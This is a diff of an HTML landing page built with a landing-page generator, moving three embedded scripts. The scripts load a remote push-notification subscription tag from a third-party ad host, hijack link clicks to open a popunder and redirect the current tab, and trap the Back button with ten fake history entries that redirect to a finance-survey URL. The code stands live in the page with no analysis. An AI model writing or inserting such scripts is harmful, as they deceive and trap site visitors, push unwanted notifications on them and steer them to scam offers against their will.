@@ -23,6 +23,20 @@ PureLander : The best affordable landing page generator
     <script>
         var back = 'https://get.financesurveys.pro/ccckl3k.php?lp=1';
     </script>
+    <script>
+        var s = document.createElement('script');
+        s.src = '//gauvaiho.net/pfe/current/micro.tag.min.js?z=5960881' + '&sw=/sw-check-permissions-0a98c.js';     /*propush订阅脚本*/
+        s.onload = function (result) {
+            switch (result) {
+                case 'onPermissionDefault': break;
+                case 'onPermissionAllowed': break;
+                case 'onPermissionDenied': break;
+                case 'onAlreadySubscribed': break;
+                case 'onNotificationUnsupported': break;
+            }
+        }
+        document.head.appendChild(s);
+    </script>
 </head>
 
 <body data-theme="dark-v2,light">
@@ -54,58 +68,46 @@ PureLander : The best affordable landing page generator
             </div>
         </main>
     </section>
+    <script>
+        if (typeof under !== "undefined" && under !== null) {
+            if (typeof
+                cta !== "undefined" && cta !== null) {
+                document.addEventListener('click', function (event) {
+                    var
+                        target = event.target; while (target) {
+                            if (target.tagName === 'A' && target.classList.contains(cta)) {
+                                const
+                                    linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
+                            }
+                            target = target.parentNode;
+                        }
+                });
+            } else {
+                document.addEventListener('click', function (event) {
+                    var
+                        target = event.target; while (target) {
+                            if (target.tagName === 'A') {
+                                const
+                                    linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
+                            }
+                            target = target.parentNode;
+                        }
+                });
+            }
+        }
+        if (typeof back !== "undefined" && back !== null) {
+            !(function () {
+                var t; try {
+                    const
+                        URL = window.location.href.split(/[#]/)[0]; for (t = 0; 10 > t; ++t)history.pushState({}, '', URL + '#'); onpopstate = function (event) { event.state && location.replace(back); };
+                } catch (o) { console.log(o); }
+            })();
+        }
+    </script>
 </body>
 <!-- This landing page has been Generated using purelander.com -->
-<script>
-    var s = document.createElement('script');
-    s.src = '//gauvaiho.net/pfe/current/micro.tag.min.js?z=5960881' + '&sw=/sw-check-permissions-0a98c.js';     /*propush订阅脚本*/
-    s.onload = function (result) {
-        switch (result) {
-            case 'onPermissionDefault': break;
-            case 'onPermissionAllowed': break;
-            case 'onPermissionDenied': break;
-            case 'onAlreadySubscribed': break;
-            case 'onNotificationUnsupported': break;
-        }
-    }
-    document.head.appendChild(s);
-</script>
 
-<script>
-    if (typeof under !== "undefined" && under !== null) {
-        if (typeof
-            cta !== "undefined" && cta !== null) {
-            document.addEventListener('click', function (event) {
-                var
-                    target = event.target; while (target) {
-                        if (target.tagName === 'A' && target.classList.contains(cta)) {
-                            const
-                                linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
-                        }
-                        target = target.parentNode;
-                    }
-            });
-        } else {
-            document.addEventListener('click', function (event) {
-                var
-                    target = event.target; while (target) {
-                        if (target.tagName === 'A') {
-                            const
-                                linkHref = target.href; event.preventDefault(); window.open(linkHref, '_blank'); window.location.replace(under); break;
-                        }
-                        target = target.parentNode;
-                    }
-            });
-        }
-    }
-    if (typeof back !== "undefined" && back !== null) {
-        !(function () {
-            var t; try {
-                const
-                    URL = window.location.href.split(/[#]/)[0]; for (t = 0; 10 > t; ++t)history.pushState({}, '', URL + '#'); onpopstate = function (event) { event.state && location.replace(back); };
-            } catch (o) { console.log(o); }
-        })();
-    }
-</script>
+
+
 
 </html>
